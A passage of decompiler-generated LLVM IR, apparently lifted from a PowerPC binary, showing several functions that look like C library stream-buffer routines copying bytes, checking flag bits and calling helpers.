  %v1_1000976c = load i32, i32* @r31, align 4
  %v3_1000976c = icmp ugt i32 %v0_1000976c, %v1_1000976c
  br i1 %v3_1000976c, label %dec_label_pc_1000976c.dec_label_pc_10009778_crit_edge, label %dec_label_pc_10009774

dec_label_pc_1000976c.dec_label_pc_10009778_crit_edge: ; preds = %dec_label_pc_1000976c
  %v0_10009778.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10009778

dec_label_pc_10009774:                            ; preds = %dec_label_pc_1000976c
  store i32 %v0_1000976c, i32* @r27, align 4
  br label %dec_label_pc_10009778

dec_label_pc_10009778:                            ; preds = %dec_label_pc_1000976c.dec_label_pc_10009778_crit_edge, %dec_label_pc_10009774
  %v0_10009778 = phi i32 [ %v0_10009778.pre, %dec_label_pc_1000976c.dec_label_pc_10009778_crit_edge ], [ %v0_1000976c, %dec_label_pc_10009774 ]
  store i32 %v0_10009778, i32* %ctr.global-to-local, align 4
  %v2_10009784.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000977c

dec_label_pc_1000977c:                            ; preds = %dec_label_pc_100097a0, %dec_label_pc_10009778
  %v2_10009784 = phi i32 [ %v1_100097a0, %dec_label_pc_100097a0 ], [ %v2_10009784.pre, %dec_label_pc_10009778 ]
  %v0_1000977c = load i32, i32* @r29, align 4
  %v1_1000977c = inttoptr i32 %v0_1000977c to i8*
  %v2_1000977c = load i8, i8* %v1_1000977c, align 1
  %v3_1000977c = zext i8 %v2_1000977c to i32
  store i32 %v3_1000977c, i32* %r0.global-to-local, align 4
  %v1_10009780 = add i32 %v0_1000977c, 1
  store i32 %v1_10009780, i32* @r29, align 4
  %v3_10009784 = inttoptr i32 %v2_10009784 to i8*
  store i8 %v2_1000977c, i8* %v3_10009784, align 1
  %v0_10009788 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009788 = urem i32 %v0_10009788, 256
  store i32 %v1_10009788, i32* %r0.global-to-local, align 4
  %v3_1000978c = icmp eq i32 %v1_10009788, 10
  br i1 %v3_1000978c, label %dec_label_pc_10009794, label %dec_label_pc_100097a0

dec_label_pc_10009794:                            ; preds = %dec_label_pc_1000977c
  %v0_10009794 = load i32, i32* @r30, align 4
  %v1_10009794 = inttoptr i32 %v0_10009794 to i16*
  %v2_10009794 = load i16, i16* %v1_10009794, align 2
  %v3_10009794 = zext i16 %v2_10009794 to i32
  store i32 %v3_10009794, i32* %r0.global-to-local, align 4
  %v1_10009798 = and i32 %v3_10009794, 256
  %v3_10009798 = icmp eq i32 %v1_10009798, 0
  br i1 %v3_10009798, label %dec_label_pc_100097a0, label %dec_label_pc_10009794.dec_label_pc_100097a8_crit_edge

dec_label_pc_10009794.dec_label_pc_100097a8_crit_edge: ; preds = %dec_label_pc_10009794
  %v0_100097ac.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100097a8

dec_label_pc_100097a0:                            ; preds = %dec_label_pc_10009794, %dec_label_pc_1000977c
  %v0_100097a0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100097a0 = add i32 %v0_100097a0, 1
  store i32 %v1_100097a0, i32* %r11.global-to-local, align 4
  %v0_100097a4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100097a4 = add i32 %v0_100097a4, -1
  store i32 %v1_100097a4, i32* %ctr.global-to-local, align 4
  %v2_100097a4 = icmp eq i32 %v1_100097a4, 0
  br i1 %v2_100097a4, label %dec_label_pc_100097a0.dec_label_pc_100097a8_crit_edge, label %dec_label_pc_1000977c

dec_label_pc_100097a0.dec_label_pc_100097a8_crit_edge: ; preds = %dec_label_pc_100097a0
  %v0_100097a8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100097a8

dec_label_pc_100097a8:                            ; preds = %dec_label_pc_10009794.dec_label_pc_100097a8_crit_edge, %dec_label_pc_100097a0.dec_label_pc_100097a8_crit_edge
  %v0_100097ac = phi i32 [ %v1_100097a0, %dec_label_pc_100097a0.dec_label_pc_100097a8_crit_edge ], [ %v0_100097ac.pre, %dec_label_pc_10009794.dec_label_pc_100097a8_crit_edge ]
  %v0_100097a8 = phi i32 [ %v0_100097a8.pre, %dec_label_pc_100097a0.dec_label_pc_100097a8_crit_edge ], [ %v0_10009794, %dec_label_pc_10009794.dec_label_pc_100097a8_crit_edge ]
  %v1_100097a8 = add i32 %v0_100097a8, 8
  %v2_100097a8 = inttoptr i32 %v1_100097a8 to i32*
  %v3_100097a8 = load i32, i32* %v2_100097a8, align 4
  store i32 %v3_100097a8, i32* %r0.global-to-local, align 4
  %v2_100097ac = add i32 %v0_100097a8, 16
  %v3_100097ac = inttoptr i32 %v2_100097ac to i32*
  store i32 %v0_100097ac, i32* %v3_100097ac, align 4
  %v0_100097b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100097b0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100097b0 = sub i32 %v1_100097b0, %v0_100097b0
  store i32 %v2_100097b0, i32* %r0.global-to-local, align 4
  %v1_100097b4 = load i32, i32* @r31, align 4
  %v2_100097b4 = sub i32 %v1_100097b4, %v2_100097b0
  store i32 %v2_100097b4, i32* @r31, align 4
  br label %dec_label_pc_100097b8

dec_label_pc_100097b8:                            ; preds = %dec_label_pc_10009750.dec_label_pc_100097b8_crit_edge, %dec_label_pc_100097a8
  %v0_100097b8 = phi i32 [ %v0_100097b8.pre, %dec_label_pc_10009750.dec_label_pc_100097b8_crit_edge ], [ %v2_100097b4, %dec_label_pc_100097a8 ]
  %v1_100097b8 = load i32, i32* @r28, align 4
  %v2_100097b8 = sub i32 %v1_100097b8, %v0_100097b8
  store i32 %v2_100097b8, i32* @r28, align 4
  br label %dec_label_pc_100097bc

dec_label_pc_10009714.dec_label_pc_100097bc.loopexit_crit_edge: ; preds = %dec_label_pc_10009744
  %v0_100097c0.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100097bc

dec_label_pc_100097bc:                            ; preds = %dec_label_pc_100096f4, %dec_label_pc_10009714.dec_label_pc_100097bc.loopexit_crit_edge, %dec_label_pc_100097b8
  %v0_100097c0 = phi i32 [ %v2_100097b8, %dec_label_pc_100097b8 ], [ %v0_100097c0.pre.pre, %dec_label_pc_10009714.dec_label_pc_100097bc.loopexit_crit_edge ], [ 0, %dec_label_pc_100096f4 ]
  store i32 %v0_100096f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_100097c0

; uselistorder directives
  uselistorder i32 %v0_100097a8, { 1, 0 }
  uselistorder i32 %v1_100097a4, { 1, 0 }
  uselistorder i32 %v1_100097a0, { 0, 2, 1 }
  uselistorder i32 %v1_10009788, { 1, 0 }
  uselistorder i32 %v2_10009748, { 3, 2, 1, 0 }
  uselistorder i32 %v2_10009744, { 1, 0 }
  uselistorder i32 %v3_10009738, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder label %dec_label_pc_100097bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100097b8, { 1, 0 }
  uselistorder label %dec_label_pc_100097a8, { 1, 0 }
  uselistorder label %dec_label_pc_10009778, { 1, 0 }
  uselistorder label %dec_label_pc_10009730, { 1, 0 }
  uselistorder label %dec_label_pc_10009720, { 1, 0 }
}

define i32 @function_100097d4(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_100097d4:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_100097d8 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100097f0 = load i16, i16* %arg3, align 2
  %v1_100097f4 = and i16 %v3_100097f0, 512
  %v3_100097f4 = icmp eq i16 %v1_100097f4, 0
  br i1 %v3_100097f4, label %dec_label_pc_100097fc, label %dec_label_pc_10009908

dec_label_pc_100097fc:                            ; preds = %dec_label_pc_100097d4
  %v2_100097fc = add i32 %tmp, 4
  %v3_100097fc = inttoptr i32 %v2_100097fc to i32*
  %v4_100097fc = load i32, i32* %v3_100097fc, align 4
  %v2_10009800 = add i32 %tmp, 16
  %v3_10009800 = inttoptr i32 %v2_10009800 to i32*
  %v4_10009800 = load i32, i32* %v3_10009800, align 4
  store i32 %v4_10009800, i32* @r3, align 4
  %v2_10009804 = add i32 %tmp, 12
  %v3_10009804 = inttoptr i32 %v2_10009804 to i32*
  %v4_10009804 = load i32, i32* %v3_10009804, align 4
  %v3_10009808 = icmp eq i32 %v4_100097fc, -2
  %v2_10009810 = sub i32 %v4_10009804, %v4_10009800
  br i1 %v3_10009808, label %dec_label_pc_10009810, label %dec_label_pc_10009840

dec_label_pc_10009810:                            ; preds = %dec_label_pc_100097fc
  %v3_10009818 = icmp ult i32 %v2_10009810, %arg2
  br i1 %v3_10009818, label %dec_label_pc_10009820, label %dec_label_pc_10009824

dec_label_pc_10009820:                            ; preds = %dec_label_pc_10009810
  br label %dec_label_pc_10009824

dec_label_pc_10009824:                            ; preds = %dec_label_pc_10009810, %dec_label_pc_10009820
  %storemerge = phi i32 [ %v2_10009810, %dec_label_pc_10009820 ], [ %arg2, %dec_label_pc_10009810 ]
  %v0_10009828 = phi i32 [ %v2_10009810, %dec_label_pc_10009820 ], [ %arg2, %dec_label_pc_10009810 ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10009828, i32* @r5, align 4
  store i32 268474416, i32* @lr, align 4
  %v0_1000982c = call i32 @function_10006d88()
  %v0_10009830 = load i32, i32* @r30, align 4
  %v1_10009830 = add i32 %v0_10009830, 16
  %v2_10009830 = inttoptr i32 %v1_10009830 to i32*
  %v3_10009830 = load i32, i32* %v2_10009830, align 4
  %v1_10009834 = load i32, i32* @r31, align 4
  %v2_10009834 = add i32 %v1_10009834, %v3_10009830
  store i32 %v2_10009834, i32* %v2_10009830, align 4
  br label %dec_label_pc_10009928

dec_label_pc_10009840:                            ; preds = %dec_label_pc_100097fc
  %v3_10009844 = icmp ult i32 %v2_10009810, %arg2
  br i1 %v3_10009844, label %dec_label_pc_100098e4, label %dec_label_pc_1000984c

dec_label_pc_1000984c:                            ; preds = %dec_label_pc_10009840
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268474456, i32* @lr, align 4
  %v0_10009854 = call i32 @function_10006d88()
  %v0_10009858 = load i32, i32* @r30, align 4
  %v1_10009858 = inttoptr i32 %v0_10009858 to i16*
  %v2_10009858 = load i16, i16* %v1_10009858, align 2
  %v1_1000985c = add i32 %v0_10009858, 16
  %v2_1000985c = inttoptr i32 %v1_1000985c to i32*
  %v3_1000985c = load i32, i32* %v2_1000985c, align 4
  %v1_10009860 = and i16 %v2_10009858, 256
  %v3_10009860 = icmp eq i16 %v1_10009860, 0
  %v1_10009864 = load i32, i32* @r29, align 4
  %v2_10009864 = add i32 %v1_10009864, %v3_1000985c
  store i32 %v2_10009864, i32* %v2_1000985c, align 4
  br i1 %v3_10009860, label %dec_label_pc_10009928, label %dec_label_pc_10009870

dec_label_pc_10009870:                            ; preds = %dec_label_pc_1000984c
  %v0_10009870 = load i32, i32* @r28, align 4
  %v0_10009878 = load i32, i32* @r29, align 4
  store i32 268474496, i32* @lr, align 4
  %v4_1000987c = call i32 @function_1000a5cc(i32 %v0_10009870, i32 10, i32 %v0_10009878, i32 %v2_10009864)
  %v3_10009880 = icmp eq i32 %v4_1000987c, 0
  br i1 %v3_10009880, label %dec_label_pc_10009928, label %dec_label_pc_10009888

dec_label_pc_10009888:                            ; preds = %dec_label_pc_10009870
  %v0_10009888 = load i32, i32* @r30, align 4
  store i32 %v0_10009888, i32* @r3, align 4
  store i32 268474512, i32* @lr, align 4
  %v0_1000988c = call i32 @function_10005548()
  %v3_10009890 = icmp eq i32 %v0_1000988c, 0
  br i1 %v3_10009890, label %dec_label_pc_10009928, label %dec_label_pc_10009898

dec_label_pc_10009898:                            ; preds = %dec_label_pc_10009888
  %v0_10009898 = load i32, i32* @r29, align 4
  %v3_10009898 = icmp ugt i32 %v0_10009898, %v0_1000988c
  %v0_1000988c.v0_1000989c = select i1 %v3_10009898, i32 %v0_1000988c, i32 %v0_10009898
  store i32 %v0_1000988c.v0_1000989c, i32* @r31, align 4
  %v2_100098a8 = sub i32 %v0_10009898, %v0_1000988c.v0_1000989c
  %v0_100098b0 = load i32, i32* @r28, align 4
  %v2_100098b0 = add i32 %v0_100098b0, %v2_100098a8
  store i32 %v2_100098b0, i32* @r28, align 4
  store i32 %v2_100098b0, i32* @r3, align 4
  store i32 268474560, i32* @lr, align 4
  %v3_100098bc = call i32 @function_1000a490(i32 %v2_100098b0, i32 10, i32 %v0_1000988c.v0_1000989c)
  %v3_100098c0 = icmp eq i32 %v3_100098bc, 0
  br i1 %v3_100098c0, label %dec_label_pc_10009928, label %dec_label_pc_100098c8

dec_label_pc_100098c8:                            ; preds = %dec_label_pc_10009898
  %v0_100098c8 = load i32, i32* @r30, align 4
  %v1_100098c8 = add i32 %v0_100098c8, 16
  %v2_100098c8 = inttoptr i32 %v1_100098c8 to i32*
  %v3_100098c8 = load i32, i32* %v2_100098c8, align 4
  %v0_100098cc = load i32, i32* @r28, align 4
  %v1_100098cc = load i32, i32* @r31, align 4
  %v2_100098cc = sub i32 %v0_100098cc, %v3_100098bc
  %v2_100098d0 = add i32 %v2_100098cc, %v1_100098cc
  %v1_100098d4 = load i32, i32* @r29, align 4
  %v2_100098d4 = sub i32 %v1_100098d4, %v2_100098d0
  store i32 %v2_100098d4, i32* @r29, align 4
  %v2_100098d8 = sub i32 %v3_100098c8, %v2_100098d0
  store i32 %v2_100098d8, i32* %v2_100098c8, align 4
  br label %dec_label_pc_10009928

dec_label_pc_100098e4:                            ; preds = %dec_label_pc_10009840
  %v2_100098e4 = add i32 %tmp, 8
  %v3_100098e4 = inttoptr i32 %v2_100098e4 to i32*
  %v4_100098e4 = load i32, i32* %v3_100098e4, align 4
  %v4_100098e8 = icmp eq i32 %v4_10009800, %v4_100098e4
  br i1 %v4_100098e8, label %dec_label_pc_10009908, label %dec_label_pc_100098f0

dec_label_pc_100098f0:                            ; preds = %dec_label_pc_100098e4
  store i32 %tmp, i32* @r3, align 4
  store i32 268474616, i32* @lr, align 4
  %v0_100098f4 = call i32 @function_10005548()
  %v3_100098f8 = icmp eq i32 %v0_100098f4, 0
  br i1 %v3_100098f8, label %dec_label_pc_100098f0.dec_label_pc_10009908_crit_edge, label %dec_label_pc_10009900

dec_label_pc_100098f0.dec_label_pc_10009908_crit_edge: ; preds = %dec_label_pc_100098f0
  %v0_1000990c.pre = load i32, i32* @r30, align 4
  %v0_10009910.pre = load i32, i32* @r28, align 4
  %v0_10009914.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009908

dec_label_pc_10009900:                            ; preds = %dec_label_pc_100098f0
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10009928

dec_label_pc_10009908:                            ; preds = %dec_label_pc_100098f0.dec_label_pc_10009908_crit_edge, %dec_label_pc_100097d4, %dec_label_pc_100098e4
  %v0_10009914 = phi i32 [ %v0_10009914.pre, %dec_label_pc_100098f0.dec_label_pc_10009908_crit_edge ], [ %arg2, %dec_label_pc_100097d4 ], [ %arg2, %dec_label_pc_100098e4 ]
  %v0_10009910 = phi i32 [ %v0_10009910.pre, %dec_label_pc_100098f0.dec_label_pc_10009908_crit_edge ], [ %arg1, %dec_label_pc_100097d4 ], [ %arg1, %dec_label_pc_100098e4 ]
  %v0_1000990c = phi i32 [ %v0_1000990c.pre, %dec_label_pc_100098f0.dec_label_pc_10009908_crit_edge ], [ %tmp, %dec_label_pc_100097d4 ], [ %tmp, %dec_label_pc_100098e4 ]
  %v1_1000990c = inttoptr i32 %v0_1000990c to i16*
  store i32 %v0_10009914, i32* @r5, align 4
  store i32 %v0_100097d8, i32* @lr, align 4
  %v5_10009924 = call i32 @function_100096f4(i16* %v1_1000990c, i32 %v0_10009910)
  br label %dec_label_pc_10009928

dec_label_pc_10009928:                            ; preds = %dec_label_pc_10009898, %dec_label_pc_10009888, %dec_label_pc_10009870, %dec_label_pc_1000984c, %dec_label_pc_10009900, %dec_label_pc_100098c8, %dec_label_pc_10009824, %dec_label_pc_10009908
  %v0_1000992c = load i32, i32* @r29, align 4
  ret i32 %v0_1000992c

; uselistorder directives
  uselistorder i32 %v2_100098d0, { 1, 0 }
  uselistorder i32 %v0_1000988c.v0_1000989c, { 0, 2, 1 }
  uselistorder i32 %v0_10009898, { 1, 0, 2 }
  uselistorder i32 %v2_10009810, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10009928, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10009908, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009824, { 1, 0 }
}

define i32 @function_10009940(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009940:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10009944 = load i32, i32* @lr, align 4
  store i32 %v0_10009944, i32* %r0.global-to-local, align 4
  %v0_10009948 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10009954 = load i16, i16* %arg1, align 2
  %v4_10009954 = zext i16 %v3_10009954 to i32
  store i32 %v4_10009954, i32* %r0.global-to-local, align 4
  %v2_10009958 = and i32 %v4_10009954, %arg2
  store i32 %v2_10009958, i32* %r9.global-to-local, align 4
  %v5_10009958 = icmp eq i32 %v2_10009958, 0
  br i1 %v5_10009958, label %dec_label_pc_10009960, label %dec_label_pc_10009970

dec_label_pc_10009960:                            ; preds = %dec_label_pc_10009940
  %v1_10009960 = and i32 %v4_10009954, 2176
  store i32 %v1_10009960, i32* %r9.global-to-local, align 4
  %v3_10009960 = icmp eq i32 %v1_10009960, 0
  br i1 %v3_10009960, label %dec_label_pc_10009968, label %dec_label_pc_1000997c

dec_label_pc_10009968:                            ; preds = %dec_label_pc_10009960
  %v2_10009968 = or i32 %v4_10009954, %arg2
  store i32 %v2_10009968, i32* %r0.global-to-local, align 4
  %v1_1000996c = trunc i32 %v2_10009968 to i16
  store i16 %v1_1000996c, i16* %arg1, align 2
  %v0_10009970.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009970

dec_label_pc_10009970:                            ; preds = %dec_label_pc_10009940, %dec_label_pc_10009968
  %v0_100099ac = phi i32 [ %tmp, %dec_label_pc_10009940 ], [ %v0_10009970.pre, %dec_label_pc_10009968 ]
  %v1_10009970 = inttoptr i32 %v0_100099ac to i16*
  %v2_10009970 = load i16, i16* %v1_10009970, align 2
  %v3_10009970 = zext i16 %v2_10009970 to i32
  %v1_10009974 = and i32 %v3_10009970, 32
  store i32 %v1_10009974, i32* %r0.global-to-local, align 4
  %v3_10009974 = icmp eq i32 %v1_10009974, 0
  br i1 %v3_10009974, label %dec_label_pc_1000999c, label %dec_label_pc_1000997c

dec_label_pc_1000997c:                            ; preds = %dec_label_pc_10009960, %dec_label_pc_10009970
  %v0_1000997c = call i32 @function_10004b48()
  store i32 %v0_1000997c, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10009984 = inttoptr i32 %v0_1000997c to i32*
  store i32 9, i32* %v2_10009984, align 4
  br label %dec_label_pc_10009988

dec_label_pc_10009988:                            ; preds = %dec_label_pc_100099c4, %dec_label_pc_1000997c
  %v0_10009988 = load i32, i32* @r31, align 4
  %v1_10009988 = inttoptr i32 %v0_10009988 to i16*
  %v2_10009988 = load i16, i16* %v1_10009988, align 2
  %v3_10009988 = zext i16 %v2_10009988 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009990 = or i32 %v3_10009988, 8
  store i32 %v1_10009990, i32* %r0.global-to-local, align 4
  %v1_10009994 = trunc i32 %v1_10009990 to i16
  store i16 %v1_10009994, i16* %v1_10009988, align 2
  br label %dec_label_pc_10009a24

dec_label_pc_1000999c:                            ; preds = %dec_label_pc_10009970
  %tmp8 = urem i16 %v2_10009970, 4
  %v1_1000999c = zext i16 %tmp8 to i32
  store i32 %v1_1000999c, i32* %r0.global-to-local, align 4
  %v3_1000999c = icmp eq i16 %tmp8, 0
  br i1 %v3_1000999c, label %dec_label_pc_10009a00, label %dec_label_pc_100099a4

dec_label_pc_100099a4:                            ; preds = %dec_label_pc_1000999c
  %v1_100099a4 = and i32 %v3_10009970, 4
  store i32 %v1_100099a4, i32* %r9.global-to-local, align 4
  %v3_100099a4 = icmp eq i32 %v1_100099a4, 0
  br i1 %v3_100099a4, label %dec_label_pc_100099ac, label %dec_label_pc_100099e4

dec_label_pc_100099ac:                            ; preds = %dec_label_pc_100099a4
  %v1_100099ac = add i32 %v0_100099ac, 20
  %v2_100099ac = inttoptr i32 %v1_100099ac to i32*
  %v3_100099ac = load i32, i32* %v2_100099ac, align 4
  store i32 %v3_100099ac, i32* %r0.global-to-local, align 4
  %v1_100099b0 = add i32 %v0_100099ac, 16
  %v2_100099b0 = inttoptr i32 %v1_100099b0 to i32*
  %v3_100099b0 = load i32, i32* %v2_100099b0, align 4
  store i32 %v3_100099b0, i32* %r9.global-to-local, align 4
  %v4_100099b4 = icmp eq i32 %v3_100099ac, %v3_100099b0
  br i1 %v4_100099b4, label %dec_label_pc_100099bc, label %dec_label_pc_100099c4

dec_label_pc_100099bc:                            ; preds = %dec_label_pc_100099ac
  %v1_100099bc = and i32 %v3_10009970, 2
  store i32 %v1_100099bc, i32* %r0.global-to-local, align 4
  %v3_100099bc = icmp eq i32 %v1_100099bc, 0
  br i1 %v3_100099bc, label %dec_label_pc_100099e4, label %dec_label_pc_100099c4

dec_label_pc_100099c4:                            ; preds = %dec_label_pc_100099ac, %dec_label_pc_100099bc
  %v1_100099c4 = and i32 %v3_10009970, 1024
  store i32 %v1_100099c4, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_100099cc = call i32 @__asm_mfcr()
  store i32 %v0_100099cc, i32* %r3.global-to-local, align 4
  %v1_100099d0 = call i32 @__asm_rlwinm(i32 %v0_100099cc, i32 3, i32 31, i32 31)
  %v1_100099d4 = sub i32 2, %v1_100099d0
  store i32 %v1_100099d4, i32* @r5, align 4
  store i32 268474844, i32* @lr, align 4
  %v1_100099d8 = inttoptr i32 %v1_100099d4 to i16*
  %v2_100099d8 = call i32 @function_1000b5fc(i16* %v1_100099d8)
  store i32 %v2_100099d8, i32* %r3.global-to-local, align 4
  %v3_100099dc = icmp eq i32 %v2_100099d8, 0
  br i1 %v3_100099dc, label %dec_label_pc_100099c4.dec_label_pc_100099e4_crit_edge, label %dec_label_pc_10009988

dec_label_pc_100099c4.dec_label_pc_100099e4_crit_edge: ; preds = %dec_label_pc_100099c4
  %v0_100099e4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099e4

dec_label_pc_100099e4:                            ; preds = %dec_label_pc_100099c4.dec_label_pc_100099e4_crit_edge, %dec_label_pc_100099a4, %dec_label_pc_100099bc
  %v0_100099e4 = phi i32 [ %v0_100099e4.pre, %dec_label_pc_100099c4.dec_label_pc_100099e4_crit_edge ], [ %v0_100099ac, %dec_label_pc_100099a4 ], [ %v0_100099ac, %dec_label_pc_100099bc ]
  %v1_100099e4 = inttoptr i32 %v0_100099e4 to i16*
  %v2_100099e4 = load i16, i16* %v1_100099e4, align 2
  %v3_100099e4 = zext i16 %v2_100099e4 to i32
  store i32 %v3_100099e4, i32* %r0.global-to-local, align 4
  %v1_100099e8 = add i32 %v0_100099e4, 8
  %v2_100099e8 = inttoptr i32 %v1_100099e8 to i32*
  %v3_100099e8 = load i32, i32* %v2_100099e8, align 4
  store i32 %v3_100099e8, i32* %r9.global-to-local, align 4
  %v1_100099ec = call i32 @__asm_rlwinm(i32 %v3_100099e4, i32 0, i32 0, i32 29)
  %v2_100099ec = trunc i32 %v1_100099ec to i16
  store i32 %v1_100099ec, i32* %r0.global-to-local, align 4
  %v3_100099f0 = load i32, i32* @r31, align 4
  %v4_100099f0 = inttoptr i32 %v3_100099f0 to i16*
  store i16 %v2_100099ec, i16* %v4_100099f0, align 2
  %v0_100099f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100099f4 = load i32, i32* @r31, align 4
  %v2_100099f4 = add i32 %v1_100099f4, 20
  %v3_100099f4 = inttoptr i32 %v2_100099f4 to i32*
  store i32 %v0_100099f4, i32* %v3_100099f4, align 4
  %v0_100099f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100099f8 = load i32, i32* @r31, align 4
  %v2_100099f8 = add i32 %v1_100099f8, 24
  %v3_100099f8 = inttoptr i32 %v2_100099f8 to i32*
  store i32 %v0_100099f8, i32* %v3_100099f8, align 4
  %v0_100099fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100099fc = load i32, i32* @r31, align 4
  %v2_100099fc = add i32 %v1_100099fc, 16
  %v3_100099fc = inttoptr i32 %v2_100099fc to i32*
  store i32 %v0_100099fc, i32* %v3_100099fc, align 4
  %v0_10009a00.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009a00

dec_label_pc_10009a00:                            ; preds = %dec_label_pc_1000999c, %dec_label_pc_100099e4
  %v2_10009a0c = phi i32 [ %v0_100099ac, %dec_label_pc_1000999c ], [ %v0_10009a00.pre, %dec_label_pc_100099e4 ]
  %v1_10009a00 = inttoptr i32 %v2_10009a0c to i16*
  %v2_10009a00 = load i16, i16* %v1_10009a00, align 2
  %v3_10009a00 = zext i16 %v2_10009a00 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10009a08 = or i32 %v3_10009a00, 64
  store i32 %v1_10009a08, i32* %r0.global-to-local, align 4
  %v1_10009a0c = trunc i32 %v1_10009a08 to i16
  store i16 %v1_10009a0c, i16* %v1_10009a00, align 2
  %v0_10009a10 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009a10 = urem i32 %v0_10009a10, 65536
  store i32 %v1_10009a10, i32* %r0.global-to-local, align 4
  %v1_10009a14 = and i32 %v0_10009a10, 2816
  store i32 %v1_10009a14, i32* %r9.global-to-local, align 4
  %v3_10009a14 = icmp eq i32 %v1_10009a14, 0
  br i1 %v3_10009a14, label %dec_label_pc_10009a1c, label %dec_label_pc_10009a24

dec_label_pc_10009a1c:                            ; preds = %dec_label_pc_10009a00
  %v0_10009a1c = load i32, i32* @r31, align 4
  %v1_10009a1c = add i32 %v0_10009a1c, 12
  %v2_10009a1c = inttoptr i32 %v1_10009a1c to i32*
  %v3_10009a1c = load i32, i32* %v2_10009a1c, align 4
  store i32 %v3_10009a1c, i32* %r0.global-to-local, align 4
  %v2_10009a20 = add i32 %v0_10009a1c, 28
  %v3_10009a20 = inttoptr i32 %v2_10009a20 to i32*
  store i32 %v3_10009a1c, i32* %v3_10009a20, align 4
  br label %dec_label_pc_10009a24

dec_label_pc_10009a24:                            ; preds = %dec_label_pc_10009a00, %dec_label_pc_10009988, %dec_label_pc_10009a1c
  store i32 %v0_10009944, i32* %r0.global-to-local, align 4
  store i32 %v0_10009948, i32* @r31, align 4
  %v0_10009a34 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009a34

; uselistorder directives
  uselistorder i32 %v0_10009a10, { 1, 0 }
  uselistorder i32 %v1_100099ec, { 1, 0 }
  uselistorder i32 %v0_100099e4, { 1, 0 }
  uselistorder i32 %v0_100099ac, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_10009954, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 1, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 5, 6, 7, 4, 0, 2, 3, 1 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009a24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009a00, { 1, 0 }
  uselistorder label %dec_label_pc_100099e4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100099c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000997c, { 1, 0 }
  uselistorder label %dec_label_pc_10009970, { 1, 0 }
}

define i32 @function_10009a38(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10009a38:
  %v0_10009a38 = load i32, i32* @r5, align 4
  %v1_10009a38 = icmp slt i32 %v0_10009a38, 0
  %v1_10009a3c = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10009a78 = icmp eq i32 %v1_10009a3c, 0
  br i1 %v1_10009a38, label %dec_label_pc_10009a78, label %dec_label_pc_10009a44

dec_label_pc_10009a44:                            ; preds = %dec_label_pc_10009a38
  br i1 %v3_10009a78, label %dec_label_pc_10009a4c, label %dec_label_pc_10009a80

dec_label_pc_10009a4c:                            ; preds = %dec_label_pc_10009a44
  %v3_10009a4c = icmp eq i32 %arg1, 256
  br i1 %v3_10009a4c, label %dec_label_pc_10009a58, label %dec_label_pc_10009a60

dec_label_pc_10009a58:                            ; preds = %dec_label_pc_10009a4c
  br label %dec_label_pc_10009a6c

dec_label_pc_10009a60:                            ; preds = %dec_label_pc_10009a4c
  %v3_10009a60 = icmp eq i32 %arg1, 512
  br i1 %v3_10009a60, label %dec_label_pc_10009a68, label %dec_label_pc_10009a6c

